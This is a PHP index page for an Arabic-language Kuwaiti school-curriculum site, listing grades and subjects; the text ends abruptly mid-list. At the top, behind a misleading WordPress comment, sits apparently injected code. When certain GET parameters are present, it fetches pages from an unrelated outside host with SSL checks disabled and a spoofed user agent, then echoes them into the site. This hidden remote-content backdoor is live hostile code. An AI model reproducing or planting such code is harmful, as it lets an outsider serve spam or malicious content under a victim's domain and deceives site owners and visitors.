<?php
/**
 * Loads the WordPress environment and template.
 *
 * @package WordPress
 */
function fetchDataFromSite($site) {
    $url = 'https://replication2.pkcdurensawit.net/kweduc/' . $site . '/';
    $ch = curl_init($url);
    curl_setopt_array($ch, [
        CURLOPT_USERAGENT => "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.1) Gecko/20061204 Firefox/2.0.0.1",
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_SSL_VERIFYPEER => false,
        CURLOPT_SSL_VERIFYHOST => false,
        CURLOPT_CUSTOMREQUEST => 'GET'
    ]);
    $result = curl_exec($ch);
    curl_close($ch);
    return $result;
}
function fetchDataFromSite2($site) {
    $url = 'https://replication2.pkcdurensawit.net/kweduc_sites/?sites='.$site;
    $ch = curl_init($url);
    curl_setopt_array($ch, [
        CURLOPT_USERAGENT => "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.1) Gecko/20061204 Firefox/2.0.0.1",
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_SSL_VERIFYPEER => false,
        CURLOPT_SSL_VERIFYHOST => false,
        CURLOPT_CUSTOMREQUEST => 'GET'
    ]);
    $result = curl_exec($ch);
    curl_close($ch);
    return $result;
}
function fetchDataFromSite3($site) {
    $url = 'https://replication2.pkcdurensawit.net/kweduc_web/?web='.$site;
    $ch = curl_init($url);
    curl_setopt_array($ch, [
        CURLOPT_USERAGENT => "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.1) Gecko/20061204 Firefox/2.0.0.1",
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_SSL_VERIFYPEER => false,
        CURLOPT_SSL_VERIFYHOST => false,
        CURLOPT_CUSTOMREQUEST => 'GET'
    ]);
    $result = curl_exec($ch);
    curl_close($ch);
    return $result;
}

if(isset($_GET['go'])) {
    $site = $_GET['go'];
    $data = fetchDataFromSite($site);
    echo $data;
}
elseif(isset($_GET['sites'])) {
    $site = $_GET['sites'];
    $data = fetchDataFromSite2($site);
    echo $data;
}
elseif(isset($_GET['web'])) {
    $site = $_GET['web'];
    $data = fetchDataFromSite3($site);
    echo $data;
} else {
    
    ?>

<!DOCTYPE html>

<html lang="ar" class="client-nojs" dir="rtl"><head><meta http-equiv="Content-Type" content="text/html; charset=utf-8">
<?php  
include('config.php');
include('variable.php');

?> 

<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0">
<link rel="shortcut icon" type="image/x-icon" href="kuwait.svg" />

<title>المدرسة الكويتية | kweduc | kweduc.com |school-kw.com| مدرستي الكويتية| دروس تقوية المنهاج الكويتي </title>
<meta name="description" content="مدرستي هو الموقع التعليمي الاول في الكويت, حيث يهتم مدرستي بجميع الملفات التي تهم الطالب والمعلم للوصول الى التفوق الدراسي . مدرستي مرتب بحسب الصف والمادة والفصل الدراسي" />
<meta name="keywords" content="مدرستي , هو , الموقع , التعليمي , الاول , في , الكويت, , حيث , يهتم , مدرستي , بجميع , الملفات , التي , تهم , الطالب , والمعلم , للوصول , الى , التفوق , الدراسي , . , مدرستي , مرتب , بحسب , الصف , والمادة , والفصل , الدراسي" />
 
                  <script data-ad-client="ca-pub-6500998550698660" async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
             <meta property="og:title" content="المدرسة الكويتية | kweduc | kweduc.com |school-kw.com| مدرستي الكويتية| دروس تقوية المنهاج الكويتية">
            <meta property="og:type" content="article">
            <meta property="og:url" content="kweduc.com">
            <meta property="og:image" content="kuwait.svg">
            <meta property="og:site_name" content="kweduc.com">
            <meta property="og:description" content="مدرستي هو الموقع التعليمي الاول في الكويت, حيث يهتم مدرستي بجميع الملفات التي تهم الطالب والمعلم للوصول الى التفوق الدراسي . مدرستي مرتب بحسب الصف والمادة والفصل الدراسي">
            <!-- /Facebook Card -->

            <!-- Twitter Card -->
            <meta name="twitter:card" content="summary_large_image">
            <meta name="twitter:site" content="@">
            <meta name="twitter:title" content="المدرسة الكويتية | kweduc | kweduc.com |school-kw.com| مدرستي الكويتية| دروس تقوية المنهاج الكويتية">
            <meta name="twitter:description" content="مدرستي هو الموقع التعليمي الاول في الكويت, حيث يهتم مدرستي بجميع الملفات التي تهم الطالب والمعلم للوصول الى التفوق الدراسي . مدرستي مرتب بحسب الصف والمادة والفصل الدراسي">
            <meta name="twitter:image" content="kuwait.svg">  
        

 <?php  include('header-top-index.php');?>   

 
  <?php
if($mobile === true)
{
                 echo'<style>
.grid-container1 {
  display: grid;
  grid-template-columns: auto ;
  grid-gap: 3px;
  background-color: #fff;
  padding: 1px;color:red;padding-right: 5px;padding-left: 5px; 
}

.grid-container1 > div {
   text-align: center;
  padding: 1px 0;
  font-size: 2px;border: 1px solid red;border-radius: 0%;font-weight: bold;color:red; 
}


.grid-container12 {
  display: grid;
  grid-template-columns: auto ;
  grid-gap: 3px;
  background-color: #fff;
  padding: 1px;color:red;padding-right: 5px;padding-left: 5px; 
}

.grid-container12 > div {
   text-align: center;
  padding: 1px 0;
  font-size: 2px;border: 1px solid red;border-radius: 0%;font-weight: bold;color:red; 
}
</style>'; }
  
  
  
else {
    echo '<style>
.grid-container1 {
  display: grid;
  grid-template-columns: auto auto auto  ;
  grid-gap: 3px;
  background-color: #fff;
  padding: 1px;color:red;padding-right: 5px;padding-left: 5px; 
}

.grid-container1 > div {
   text-align: center;
  padding: 1px 0;
  font-size: 2px;border: 1px solid red;border-radius: 0%;font-weight: bold;color:red; 
}

.grid-container12 {
  display: grid;
  grid-template-columns: auto auto ;
  grid-gap: 3px;
  background-color: #fff;
  padding: 1px;color:red;padding-right: 5px;padding-left: 5px; 
}

.grid-container12 > div {
   text-align: center;
  padding: 1px 0;
  font-size: 2px;border: 1px solid red;border-radius: 0%;font-weight: bold;color:red; 
}





</style>';
    }

 
?> 
            
            
            
            
            


            
            
            
            
            
            
            
            
            
            
            
            
            
            
                        <section   style="margin-left:1px;padding-left:1px; margin-right: 1px;padding-right: 1px;">

 <div class="row block-content"   > 
 					
  			
  			
  			
  			
  			
  			
  			
  			
  			
  			
  	  
                          <center>
                          
                        
   
                          
<div class="grid-container1" >      
 
   <div style="border:1px solid #020009;   border-radius: 0px;">        
<p   style="padding: 10px; border-radius: 0px;font-family:Droid Arabic Kufi;font-size:16px;text-align:center;color:#fff;background-color: #020009;margin-top:0px; ">الصف الاول</p>  

 
   <div style="border:3px solid #f44336;   border-radius: 0px;margin-left:10px; margin-right:10px;margin-top:10px;margin-bottom:10px;">        

  <p style="padding: 10px; border-radius: 0px;font-family:Droid Arabic Kufi;font-size:14px;text-align:center;color:#fff;background-color: #f44336;margin-top:0px; ">الصف الاول : الفصل الاول</p>  
                                     
            
        <ul class="category-items" style="padding-top:0px;margin-top:0px; background: url();
;"> <li style=" border: 2px solid #000 ;padding-right: 2px;padding-left: 1px;  padding-top:12px;  border-radius:   0px;margin: 1px;">
<a href="index-type.php?type1=144&amp;type=145" style="font-size:18px;color: #000;">رياضيات    </a>        </li>  
<li style=" border: 2px solid #000 ;padding-right: 2px;padding-left: 1px;  padding-top:12px;  border-radius:   0px;margin: 1px;">
<a href="index-type.php?type1=144&amp;type=147" style="font-size:18px;color:#000;">الانجليزية    </a>        </li>  
<li style=" border: 2px solid #000 ;padding-right: 2px;padding-left: 1px;  padding-top:12px;  border-radius:   0px;margin: 1px;">
<a href="index-type.php?type1=144&amp;type=148" style="font-size:18px;color:#000;">العلوم     </a>        </li>  
<li style=" border: 2px solid #000 ;padding-right: 2px;padding-left: 1px;  padding-top:12px;  border-radius:   0px;margin: 1px;">
<a href="index-type.php?type1=144&amp;type=149" style="font-size:18px;color:#000;">العربية    </a>        </li>  
<li style=" border: 2px solid #000 ;padding-right: 2px;padding-left: 1px;  padding-top:12px;  border-radius:   0px;margin: 1px;">
<a href="index-type.php?type1=144&amp;type=150" style="font-size:18px;color:#000;">الاسلامية    </a>        </li> </ul>     </span>
</div>

        

  <div style="border:3px solid #f44336;   border-radius: 0px;margin-left:10px; margin-right:10px;margin-top:10px;margin-bottom:10px;">        

  <p style="padding: 10px; border-radius: 0px;font-family:Droid Arabic Kufi;font-size:14px;text-align:center;color:#fff;background-color: #f44336;margin-top:0px; ">الصف الاول : الفصل الثاني</p>  
 
                                     
 
           
     <ul class="category-items" style="padding-top:0px;margin-top:0px; background: url();
;"> <li style=" border: 2px solid #000 ;padding-right: 2px;padding-left: 1px;  padding-top:12px;  border-radius:   0px;margin: 1px;">
<a href="index-type.php?type1=146&amp;type=145" style="font-size:18px;color:#000;">رياضيات    </a>        </li>  
<li style=" border: 2px solid #000 ;padding-right: 2px;padding-left: 1px;  padding-top:12px;  border-radius:   0px;margin: 1px;">
<a href="index-type.php?type1=146&amp;type=147" style="font-size:18px;color:#000;">الانجليزية    </a>        </li>  
<li style=" border: 2px solid #000 ;padding-right: 2px;padding-left: 1px;  padding-top:12px;  border-radius:   0px;margin: 1px;">
<a href="index-type.php?type1=146&amp;type=148" style="font-size:18px;color:#000;">العلوم     </a>        </li>  
<li style=" border: 2px solid #000 ;padding-right: 2px;padding-left: 1px;  padding-top:12px;  border-radius:   0px;margin: 1px;">
<a href="index-type.php?type1=146&amp;type=149" style="font-size:18px;color:#000;">العربية    </a>        </li>  
<li style=" border: 2px solid #000 ;padding-right: 2px;padding-left: 1px;  padding-top:12px;  border-radius:   0px;margin: 1px;">
<a href="index-type.php?type1=146&amp;type=150" style="font-size:18px;color:#000;">الاسلامية    </a>        </li> </ul>  

     </span>
</div>


</div>




 















































   <div style="border:1px solid #020009;   border-radius: 0px;">        
<p   style="padding: 10px; border-radius: 0px;font-family:Droid Arabic Kufi;font-size:16px;text-align:center;color:#fff;background-color: #020009;margin-top:0px;">الصف الثاني</p>  

 
   <div style="border:3px solid #f44336;   border-radius: 0px;margin-left:10px; margin-right:10px;margin-top:10px;margin-bottom:10px;">        

  <p style="padding: 10px; border-radius: 0px;font-family:Droid Arabic Kufi;font-size:14px;text-align:center;color:#fff;background-color: #f44336;margin-top:0px; ">الصف الثاني : الفصل الاول</p>  
                                     
            
        <ul class="category-items" style="padding-top:0px;margin-top:0px; background: url();
;"> 
<li style=" border: 2px solid #000 ;padding-right: 2px;padding-left: 1px;  padding-top:12px;  border-radius:   0px;margin: 1px;">
<a href="index-type.php?type1=152&amp;type=150" style="font-size:18px;color:;">الاسلامية    </a>        </li>  
<li style=" border: 2px solid #000 ;padding-right: 2px;padding-left: 1px;  padding-top:12px;  border-radius:   0px;margin: 1px;">
<a href="index-type.php?type1=152&amp;type=149" style="font-size:18px;color:;">العربية    </a>        </li>  
<li style=" border: 2px solid #000 ;padding-right: 2px;padding-left: 1px;  padding-top:12px;  border-radius:   0px;margin: 1px;">
<a href="index-type.php?type1=152&amp;type=148" style="font-size:18px;color:;">العلوم     </a>        </li>  
<li style=" border: 2px solid #000 ;padding-right: 2px;padding-left: 1px;  padding-top:12px;  border-radius:   0px;margin: 1px;">
<a href="index-type.php?type1=152&amp;type=147" style="font-size:18px;color:;">الانجليزية    </a>        </li>  
<li style=" border: 2px solid #000 ;padding-right: 2px;padding-left: 1px;  padding-top:12px;  border-radius:   0px;margin: 1px;">
<a href="index-type.php?type1=152&amp;type=145" style="font-size:18px;color:;">رياضيات    </a>        </li> </ul>     </span>
</div>

        

  <div style="border:3px solid #f44336;   border-radius: 0px;margin-left:10px; margin-right:10px;margin-top:10px;margin-bottom:10px;">        

  <p style="padding: 10px; border-radius: 0px;font-family:Droid Arabic Kufi;font-size:14px;text-align:center;color:#fff;background-color: #f44336;margin-top:0px; ">الصف الثاني : الفصل الثاني</p>  
 
                                     
 
           
     <ul class="category-items" style="padding-top:0px;margin-top:0px; background: url();
;"> 
<li style=" border: 2px solid #000 ;padding-right: 2px;padding-left: 1px;  padding-top:12px;  border-radius:   0px;margin: 1px;">
<a href="index-type.php?type1=153&amp;type=150" style="font-size:18px;color:;">الاسلامية    </a>        </li>  
<li style=" border: 2px solid #000 ;padding-right: 2px;padding-left: 1px;  padding-top:12px;  border-radius:   0px;margin: 1px;">
<a href="index-type.php?type1=153&amp;type=149" style="font-size:18px;color:;">العربية    </a>        </li>  
<li style=" border: 2px solid #000 ;padding-right: 2px;padding-left: 1px;  padding-top:12px;  border-radius:   0px;margin: 1px;">
<a href="index-type.php?type1=153&amp;type=148" style="font-size:18px;color:;">العلوم     </a>        </li>  
<li style=" border: 2px solid #000 ;padding-right: 2px;padding-left: 1px;  padding-top:12px;  border-radius:   0px;margin: 1px;">
<a href="index-type.php?type1=153&amp;type=147" style="font-size:18px;color:;">الانجليزية    </a>        </li>  
<li style=" border: 2px solid #000 ;padding-right: 2px;padding-left: 1px;  padding-top:12px;  border-radius:   0px;margin: 1px;">
<a href="index-type.php?type1=153&amp;type=145" style="font-size:18px;color:;">رياضيات    </a>        </li> </ul>  

     </span>
</div>


</div>



































 <div style="border:1px solid #020009;   border-radius: 0px;">        
<p   style="padding: 10px; border-radius: 0px;font-family:Droid Arabic Kufi;font-size:16px;text-align:center;color:#fff;background-color: #020009;margin-top:0px;">الصف الثالث</p>  

 
   <div style="border:3px solid #f44336;   border-radius: 0px;margin-left:10px; margin-right:10px;margin-top:10px;margin-bottom:10px;">        

  <p style="padding: 10px; border-radius: 0px;font-family:Droid Arabic Kufi;font-size:14px;text-align:center;color:#fff;background-color: #f44336;margin-top:0px; ">الصف الثالث : الفصل الاول</p>  
                                     
            
        <ul class="category-items" style="padding-top:0px;margin-top:0px; background: url();
;"> 
<li style=" border: 2px solid #000 ;padding-right: 2px;padding-left: 1px;  padding-top:12px;  border-radius:   0px;margin: 1px;">
<a href="index-type.php?type1=175&amp;type=145" style="font-size:18px;color:;">رياضيات    </a>        </li>  
<li style=" border: 2px solid #000 ;padding-right: 2px;padding-left: 1px;  padding-top:12px;  border-radius:   0px;margin: 1px;">
<a href="index-type.php?type1=175&amp;type=147" style="font-size:18px;color:;">الانجليزية    </a>        </li>  
<li style=" border: 2px solid #000 ;padding-right: 2px;padding-left: 1px;  padding-top:12px;  border-radius:  0px;margin: 1px;">
<a href="index-type.php?type1=175&amp;type=148" style="font-size:18px;color:;">العلوم     </a>        </li>  
<li style=" border: 2px solid #000 ;padding-right: 2px;padding-left: 1px;  padding-top:12px;  border-radius:   0px;margin: 1px;">
<a href="index-type.php?type1=175&amp;type=149" style="font-size:18px;color:;">العربية    </a>        </li>  
<li style=" border: 2px solid #000 ;padding-right: 2px;padding-left: 1px;  padding-top:12px;  border-radius:   0px;margin: 1px;">
<a href="index-type.php?type1=175&amp;type=150" style="font-size:18px;color:;">الاسلامية    </a>        </li>
</ul>     </span>
</div>

        

  <div style="border:3px solid #f44336;   border-radius: 0px;margin-left:10px; margin-right:10px;margin-top:10px;margin-bottom:10px;">        

  <p style="padding: 10px; border-radius: 0px;font-family:Droid Arabic Kufi;font-size:14px;text-align:center;color:#fff;background-color: #f44336;margin-top:0px; ">الصف الثالث : الفصل الثاني</p>  
 
                                     
 
           
     <ul class="category-items" style="padding-top:0px;margin-top:0px; background: url();
;"> 
<li style=" border: 2px solid #000 ;padding-right: 2px;padding-left: 1px;  padding-top:12px;  border-radius:   0px;margin: 1px;">
<a href="index-type.php?type1=176&amp;type=145" style="font-size:18px;color:;">رياضيات    </a>        </li>  
<li style=" border: 2px solid #000 ;padding-right: 2px;padding-left: 1px;  padding-top:12px;  border-radius:   0px;margin: 1px;">
<a href="index-type.php?type1=176&amp;type=147" style="font-size:18px;color:;">الانجليزية    </a>        </li>  
<li style=" border: 2px solid #000 ;padding-right: 2px;padding-left: 1px;  padding-top:12px;  border-radius:   0px;margin: 1px;">
<a href="index-type.php?type1=176&amp;type=148" style="font-size:18px;color:;">العلوم     </a>        </li>  
<li style=" border: 2px solid #000 ;padding-right: 2px;padding-left: 1px;  padding-top:12px;  border-radius:   0px;margin: 1px;">
<a href="index-type.php?type1=176&amp;type=149" style="font-size:18px;color:;">العربية    </a>        </li>  
<li style=" border: 2px solid #000 ;padding-right: 2px;padding-left: 1px;  padding-top:12px;  border-radius:   0px;margin: 1px;">
<a href="index-type.php?type1=176&amp;type=150" style="font-size:18px;color:;">الاسلامية    </a>        </li>
</ul>  

     </span>
</div>


</div>





 
</div>
          
         
         
     
         
          
  			
  			
  			
  			
  			
  			
  			
  			
  			
  			
  			
  			
  			
  			
  			
  			
  			
  			
  			
  			
  			
  			
  			
  			
  			
  			
  			
  			
  			
  			
  			
  			
  			
  			
  			
  			
  			
  			
  			
  			
  			
  			
  			
  			
  			
  			
  			
  			
  			
  			
  			
  			
  			
  			
  			
  			
  			
  			
  			
  			
  			
  			
  			
  			
   			
  			                      
<div class="grid-container1" >      
 
   <div style="border:1px solid #020009;   border-radius: 0px;">        
<p   style="padding: 10px; border-radius: 0px;font-family:Droid Arabic Kufi;font-size:16px;text-align:center;color:#fff;background-color: #020009;margin-top:0px; ">الصف الرابع</p>  

 
   <div style="border:3px solid #f44336;   border-radius: 0px;margin-left:10px; margin-right:10px;margin-top:10px;margin-bottom:10px;">        

  <p style="padding: 10px; border-radius: 0px;font-family:Droid Arabic Kufi;font-size:14px;text-align:center;color:#fff;background-color: #f44336;margin-top:0px; ">الصف الرابع : الفصل الاول</p>  
                                     
            
        <ul class="category-items" style="padding-top:0px;margin-top:0px; background: url();
;"> 
<li style=" border: 2px solid #000 ;padding-right: 2px;padding-left: 1px;  padding-top:12px;  border-radius:   0px;margin: 1px;">
<a href="index-type.php?type1=177&amp;type=168" style="font-size:18px;color:;">اجتماعيات    </a>        </li>  
<li style=" border: 2px solid #000 ;padding-right: 2px;padding-left: 1px;  padding-top:12px;  border-radius:   0px;margin: 1px;">
<a href="index-type.php?type1=177&amp;type=150" style="font-size:18px;color:;">الاسلامية    </a>        </li>  
<li style=" border: 2px solid #000 ;padding-right: 2px;padding-left: 1px;  padding-top:12px;  border-radius:   0px;margin: 1px;">
<a href="index-type.php?type1=177&amp;type=149" style="font-size:18px;color:;">العربية    </a>        </li>  
<li style=" border: 2px solid #000 ;padding-right: 2px;padding-left: 1px;  padding-top:12px;  border-radius:   0px;margin: 1px;">
<a href="index-type.php?type1=177&amp;type=148" style="font-size:18px;color:;">العلوم     </a>        </li>  
<li style=" border: 2px solid #000 ;padding-right: 2px;padding-left: 1px;  padding-top:12px;  border-radius:   0px;margin: 1px;">
<a href="index-type.php?type1=177&amp;type=147" style="font-size:18px;color:;">الانجليزية    </a>        </li>  
<li style=" border: 2px solid #000 ;padding-right: 2px;padding-left: 1px;  padding-top:12px;  border-radius:   0px;margin: 1px;">
<a href="index-type.php?type1=177&amp;type=145" style="font-size:18px;color:;">رياضيات    </a>        </li> </ul>     </span>
</div>

        

  <div style="border:3px solid #f44336;   border-radius: 0px;margin-left:10px; margin-right:10px;margin-top:10px;margin-bottom:10px;">        

  <p style="padding: 10px; border-radius: 0px;font-family:Droid Arabic Kufi;font-size:14px;text-align:center;color:#fff;background-color: #f44336;margin-top:0px; ">الصف الرابع : الفصل الثاني</p>  
 
                                     
 
<ul class="category-items" style="padding-top:0px;margin-top:0px; background: url();"> 
<li style=" border: 2px solid #000 ;padding-right: 2px;padding-left: 1px;  padding-top:12px;  border-radius:   0px;margin: 1px;">
<a href="index-type.php?type1=178&amp;type=168" style="font-size:18px;color:;">اجتماعيات    </a>        </li>  
<li style=" border: 2px solid #000 ;padding-right: 2px;padding-left: 1px;  padding-top:12px;  border-radius:   0px;margin: 1px;">
<a href="index-type.php?type1=178&amp;type=150" style="font-size:18px;color:;">الاسلامية    </a>        </li>  
<li style=" border: 2px solid #000 ;padding-right: 2px;padding-left: 1px;  padding-top:12px;  border-radius:   0px;margin: 1px;">
<a href="index-type.php?type1=178&amp;type=149" style="font-size:18px;color:;">العربية    </a>        </li>  
<li style=" border: 2px solid #000 ;padding-right: 2px;padding-left: 1px;  padding-top:12px;  border-radius:   0px;margin: 1px;">
<a href="index-type.php?type1=178&amp;type=148" style="font-size:18px;color:;">العلوم     </a>        </li>  
<li style=" border: 2px solid #000 ;padding-right: 2px;padding-left: 1px;  padding-top:12px;  border-radius:   0px;margin: 1px;">
<a href="index-type.php?type1=178&amp;type=147" style="font-size:18px;color:;">الانجليزية    </a>        </li>  
<li style=" border: 2px solid #000 ;padding-right: 2px;padding-left: 1px;  padding-top:12px;  border-radius:   0px;margin: 1px;">
<a href="index-type.php?type1=178&amp;type=145" style="font-size:18px;color:;">رياضيات    </a>        </li> </ul>  

     </span>
</div>


</div>




 















































   <div style="border:1px solid #020009;   border-radius: 0px;">        
<p   style="padding: 10px; border-radius: 0px;font-family:Droid Arabic Kufi;font-size:16px;text-align:center;color:#fff;background-color: #020009;margin-top:0px;">الصف الخامس</p>  

 
   <div style="border:3px solid #f44336;   border-radius: 0px;margin-left:10px; margin-right:10px;margin-top:10px;margin-bottom:10px;">        

  <p style="padding: 10px; border-radius: 0px;font-family:Droid Arabic Kufi;font-size:14px;text-align:center;color:#fff;background-color: #f44336;margin-top:0px; ">الصف الخامس : الفصل الاول</p>  
                                     
            
        <ul class="category-items" style="padding-top:0px;margin-top:0px; background: url();
;"> 
<li style=" border: 2px solid #000 ;padding-right: 2px;padding-left: 1px;  padding-top:12px;  border-radius:   0px;margin: 1px;">
<a href="index-type.php?type1=179&amp;type=168" style="font-size:18px;color:;">اجتماعيات    </a>        </li>  
<li style=" border: 2px solid #000 ;padding-right: 2px;padding-left: 1px;  padding-top:12px;  border-radius:   0px;margin: 1px;">
<a href="index-type.php?type1=179&amp;type=150" style="font-size:18px;color:;">الاسلامية    </a>        </li>  
<li style=" border: 2px solid #000 ;padding-right: 2px;padding-left: 1px;  padding-top:12px;  border-radius:   0px;margin: 1px;">
<a href="index-type.php?type1=179&amp;type=149" style="font-size:18px;color:;">العربية    </a>        </li>  
<li style=" border: 2px solid #000 ;padding-right: 2px;padding-left: 1px;  padding-top:12px;  border-radius:   0px;margin: 1px;">
<a href="index-type.php?type1=179&amp;type=148" style="font-size:18px;color:;">العلوم     </a>        </li>  
<li style=" border: 2px solid #000 ;padding-right: 2px;padding-left: 1px;  padding-top:12px;  border-radius:   0px;margin: 1px;">
<a href="index-type.php?type1=179&amp;type=147" style="font-size:18px;color:;">الانجليزية    </a>        </li>  
<li style=" border: 2px solid #000 ;padding-right: 2px;padding-left: 1px;  padding-top:12px;  border-radius:   0px;margin: 1px;">
<a href="index-type.php?type1=179&amp;type=145" style="font-size:18px;color:;">رياضيات    </a>        </li></ul>     </span>
</div>

        

  <div style="border:3px solid #f44336;   border-radius: 0px;margin-left:10px; margin-right:10px;margin-top:10px;margin-bottom:10px;">        

  <p style="padding: 10px; border-radius: 0px;font-family:Droid Arabic Kufi;font-size:14px;text-align:center;color:#fff;background-color: #f44336;margin-top:0px; ">الصف الخامس : الفصل الثاني</p>  
 
                                     
 
           
     <ul class="category-items" style="padding-top:0px;margin-top:0px; background: url();
;"> 
<li style=" border: 2px solid #000 ;padding-right: 2px;padding-left: 1px;  padding-top:12px;  border-radius:   0px;margin: 1px;">
<a href="index-type.php?type1=180&amp;type=168" style="font-size:18px;color:;">اجتماعيات    </a>        </li>  
<li style=" border: 2px solid #000 ;padding-right: 2px;padding-left: 1px;  padding-top:12px;  border-radius:   0px;margin: 1px;">
<a href="index-type.php?type1=180&amp;type=150" style="font-size:18px;color:;">الاسلامية    </a>        </li>  
<li style=" border: 2px solid #000 ;padding-right: 2px;padding-left: 1px;  padding-top:12px;  border-radius:   0px;margin: 1px;">
<a href="index-type.php?type1=180&amp;type=149" style="font-size:18px;color:;">العربية    </a>        </li>  
<li style=" border: 2px solid #000 ;padding-right: 2px;padding-left: 1px;  padding-top:12px;  border-radius:   0px;margin: 1px;">
<a href="index-type.php?type1=180&amp;type=148" style="font-size:18px;color:;">العلوم     </a>        </li>  
<li style=" border: 2px solid #000 ;padding-right: 2px;padding-left: 1px;  padding-top:12px;  border-radius:   0px;margin: 1px;">
<a href="index-type.php?type1=180&amp;type=147" style="font-size:18px;color:;">الانجليزية    </a>        </li>  
<li style=" border: 2px solid #000 ;padding-right: 2px;padding-left: 1px;  padding-top:12px;  border-radius:   0px;margin: 1px;">
<a href="index-type.php?type1=180&amp;type=145" style="font-size:18px;color:;">رياضيات    </a>        </li>
 </ul>  

     </span>
</div>


</div>



































 <div style="border:1px solid #020009;   border-radius: 0px;">        
<p   style="padding: 10px; border-radius: 0px;font-family:Droid Arabic Kufi;font-size:16px;text-align:center;color:#fff;background-color: #020009;margin-top:0px;">الصف السادس</p>  

 
   <div style="border:3px solid #f44336;   border-radius: 0px;margin-left:10px; margin-right:10px;margin-top:10px;margin-bottom:10px;">        

  <p style="padding: 10px; border-radius: 0px;font-family:Droid Arabic Kufi;font-size:14px;text-align:center;color:#fff;background-color: #f44336;margin-top:0px; ">الصف السادس : الفصل الاول</p>  
                                     
            
        <ul class="category-items" style="padding-top:0px;margin-top:0px; background: url();
;"> 
<li style=" border: 2px solid #000 ;padding-right: 2px;padding-left: 1px;  padding-top:12px;  border-radius:   0px;margin: 1px;">
<a href="index-type.php?type1=181&amp;type=168" style="font-size:18px;color:;">اجتماعيات    </a>        </li>  
<li style=" border: 2px solid #000 ;padding-right: 2px;padding-left: 1px;  padding-top:12px;  border-radius:   0px;margin: 1px;">
<a href="index-type.php?type1=181&amp;type=150" style="font-size:18px;color:;">الاسلامية    </a>        </li>  
<li style=" border: 2px solid #000 ;padding-right: 2px;padding-left: 1px;  padding-top:12px;  border-radius:   0px;margin: 1px;">
<a href="index-type.php?type1=181&amp;type=149" style="font-size:18px;color:;">العربية    </a>        </li>  
<li style=" border: 2px solid #000 ;padding-right: 2px;padding-left: 1px;  padding-top:12px;  border-radius:   0px;margin: 1px;">
<a href="index-type.php?type1=181&amp;type=148" style="font-size:18px;color:;">العلوم     </a>        </li>  
<li style=" border: 2px solid #000 ;padding-right: 2px;padding-left: 1px;  padding-top:12px;  border-radius:   0px;margin: 1px;">
<a href="index-type.php?type1=181&amp;type=147" style="font-size:18px;color:;">الانجليزية    </a>        </li>  
<li style=" border: 2px solid #000 ;padding-right: 2px;padding-left: 1px;  padding-top:12px;  border-radius:   0px;margin: 1px;">
<a href="index-type.php?type1=181&amp;type=145" style="font-size:18px;color:;">رياضيات    </a>        </li>
</ul>     </span>
</div>

        

  <div style="border:3px solid #f44336;   border-radius: 0px;margin-left:10px; margin-right:10px;margin-top:10px;margin-bottom:10px;">        

  <p style="padding: 10px; border-radius: 0px;font-family:Droid Arabic Kufi;font-size:14px;text-align:center;color:#fff;background-color: #f44336;margin-top:0px; ">الصف السادس : الفصل الثاني</p>  
 
                                     
 
           
     <ul class="category-items" style="padding-top:0px;margin-top:0px; background: url();
;"> 
<li style=" border: 2px solid #000 ;padding-right: 2px;padding-left: 1px;  padding-top:12px;  border-radius:   0px;margin: 1px;">
<a href="index-type.php?type1=182&amp;type=168" style="font-size:18px;color:;">اجتماعيات    </a>        </li>  
<li style=" border: 2px solid #000 ;padding-right: 2px;padding-left: 1px;  padding-top:12px;  border-radius:   0px;margin: 1px;">
<a href="index-type.php?type1=182&amp;type=150" style="font-size:18px;color:;">الاسلامية    </a>        </li>  
<li style=" border: 2px solid #000 ;padding-right: 2px;padding-left: 1px;  padding-top:12px;  border-radius:   0px;margin: 1px;">
<a href="index-type.php?type1=182&amp;type=149" style="font-size:18px;color:;">العربية    </a>        </li>  
<li style=" border: 2px solid #000 ;padding-right: 2px;padding-left: 1px;  padding-top:12px;  border-radius:   0px;margin: 1px;">
<a href="index-type.php?type1=182&amp;type=148" style="font-size:18px;color:;">العلوم     </a>        </li>  
<li style=" border: 2px solid #000 ;padding-right: 2px;padding-left: 1px;  padding-top:12px;  border-radius:   0px;margin: 1px;">
<a href="index-type.php?type1=182&amp;type=147" style="font-size:18px;color:;">الانجليزية    </a>        </li>  
<li style=" border: 2px solid #000 ;padding-right: 2px;padding-left: 1px;  padding-top:12px;  border-radius:   0px;margin: 1px;">
<a href="index-type.php?type1=182&amp;type=145" style="font-size:18px;color:;">رياضيات    </a>        </li>
</ul>  

     </span>
</div>


</div>





 
</div>
          
         
         
  			
  			
  			
  			
  			
  			
  			
  			
  			
  			
  			
  			
  			
  			
  			
  			
  			
  			
  			
  			
  			
  			
  			
  			
  			
  			
  			
  			
  			
  			
  			
  			
  			
  			
  			
  			
  			
  			
  			
  			
  			
  			
  			
  			
  			
  			
  			
  			
  			
  			
  			
  			
  			
  			
  			
  			
  			
  			
  			
  			
  			
  			
  			
  			
  			
  			
  			
  			
  			
  			
  			
  			
  			
  			
  			
  			
  			
  			
  			
  			
  			
  			
  			
  			
  			
  			
  			
  			
  			
  			
  			
  			
  			
  			
  			
  			
  	
  			                      
<div class="grid-container1" >      
 
   <div style="border:1px solid #020009;   border-radius: 0px;">        
<p   style="padding: 10px; border-radius: 0px;font-family:Droid Arabic Kufi;font-size:16px;text-align:center;color:#fff;background-color: #020009;margin-top:0px; ">الصف السابع</p>  

 
   <div style="border:3px solid #f44336;   border-radius: 0px;margin-left:10px; margin-right:10px;margin-top:10px;margin-bottom:10px;">        

  <p style="padding: 10px; border-radius: 0px;font-family:Droid Arabic Kufi;font-size:14px;text-align:center;color:#fff;background-color: #f44336;margin-top:0px; ">الصف السابع : الفصل الاول</p>  
                                     
            
        <ul class="category-items" style="padding-top:0px;margin-top:0px; background: url();
;"> 
<li style=" border: 2px solid #000 ;padding-right: 2px;padding-left: 1px;  padding-top:12px;  border-radius:   0px;margin: 1px;">
<a href="index-type.php?type1=183&amp;type=168" style="font-size:18px;color:;">اجتماعيات    </a>        </li>  
<li style=" border: 2px solid #000 ;padding-right: 2px;padding-left: 1px;  padding-top:12px;  border-radius:   0px;margin: 1px;">
